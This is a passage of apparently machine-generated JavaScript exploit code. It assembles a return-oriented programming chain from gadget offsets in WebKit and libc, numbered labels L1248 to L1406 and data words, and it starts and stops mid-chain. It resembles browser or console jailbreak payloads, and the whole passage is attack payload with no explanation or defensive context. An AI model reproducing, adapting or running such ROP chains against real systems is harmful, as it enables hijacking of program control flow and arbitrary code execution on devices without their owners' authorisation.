db([25, 0]); // 0x19
set_gadget(libc_base+757614,); //pop rcx
//L1248:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+113368, //L1249-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+113384, //L1250-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1249:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1250:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+113472, //L1251-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1251:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+113528, //L1254-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1254:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+113600, //L1255-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1255:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+113656, //L1258-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1258:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L1259:
webkit_base+24689276, //mov [rdi + 0x38], r8
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+113808, //L1262-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1260:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1262:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+113912, //L1265-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+113896, //L1264-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1264:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1265:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+114056, //L1268-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+114024, //L1266-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+114040, //L1267-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1266:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1267:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1268:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+114128, //L1269-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1269:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+114184, //L1272-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1272:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+114264, //L1273-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1273:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1274:
db([26, 0]); // 0x1a
set_gadget(libc_base+757614,); //pop rcx
//L1275:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+114368, //L1276-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+114384, //L1277-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1276:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+114472, //L1278-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1278:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+114528, //L1281-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1281:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+114600, //L1282-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1282:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+114656, //L1285-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1285:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L1286:
libc_base+467092, //pop rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+114808, //L1289-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1287:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1289:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+114912, //L1292-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+114896, //L1291-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1291:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1292:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+115056, //L1295-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+115024, //L1293-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+115040, //L1294-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1293:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1294:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1295:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+115128, //L1296-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1296:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+115184, //L1299-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1299:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+115264, //L1300-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1300:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1301:
db([27, 0]); // 0x1b
set_gadget(libc_base+757614,); //pop rcx
//L1302:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+115368, //L1303-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+115384, //L1304-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1303:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1304:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+115472, //L1305-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1305:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+115528, //L1308-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1308:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+115600, //L1309-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1309:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+115656, //L1312-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1312:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+115760, //L1315-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1313:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L1315:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+115864, //L1318-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+115848, //L1317-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1317:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1318:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+116008, //L1321-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+115976, //L1319-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+115992, //L1320-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1319:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1320:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1321:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+116080, //L1322-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1322:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+116136, //L1325-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1325:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+116216, //L1326-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1326:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1327:
db([3, 0]); // 0x3
set_gadget(libc_base+757614,); //pop rcx
//L1328:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+116320, //L1329-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+116336, //L1330-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1329:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1330:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+116424, //L1331-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1331:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+116480, //L1334-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1334:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+116600, //L1337-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1335:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1337:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+116704, //L1340-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+116688, //L1339-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1339:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+116848, //L1343-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+116816, //L1341-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+116832, //L1342-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1341:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1342:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1343:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+116920, //L1344-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1344:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+116976, //L1347-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1347:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+117056, //L1348-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1348:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1349:
db([28, 0]); // 0x1c
set_gadget(libc_base+757614,); //pop rcx
//L1350:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+117160, //L1351-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+117176, //L1352-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1351:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1352:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+117264, //L1353-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1353:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+117320, //L1356-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1356:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+117392, //L1357-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1357:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+117448, //L1360-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1360:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L1361:
webkit_base+25694848, //mov [rax + 0x10], r9
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+117600, //L1364-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1362:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1364:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+117704, //L1367-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+117688, //L1366-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1366:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1367:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+117848, //L1370-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+117816, //L1368-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+117832, //L1369-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1368:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1369:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1370:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+117920, //L1371-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1371:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+117976, //L1374-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1374:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+118056, //L1375-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1375:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1376:
db([29, 0]); // 0x1d
set_gadget(libc_base+757614,); //pop rcx
//L1377:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+118160, //L1378-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+118176, //L1379-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1378:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1379:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+118264, //L1380-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1380:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+118320, //L1383-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1383:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+118392, //L1384-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1384:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+118448, //L1387-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1387:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
//L1388:
libc_base+155394, //pop rdi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+118600, //L1391-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1389:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1391:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+118704, //L1394-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+118688, //L1393-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1393:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1394:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+118848, //L1397-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+118816, //L1395-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+118832, //L1396-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1395:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1396:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1397:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+118920, //L1398-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1398:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+118976, //L1401-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1401:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+119056, //L1402-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1402:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1403:
db([30, 0]); // 0x1e
set_gadget(libc_base+757614,); //pop rcx
//L1404:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+29846774, //imul rax, rcx
libc_base+362222, //pop rsi
ropchain+119160, //L1405-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+119176, //L1406-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1405:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1406:
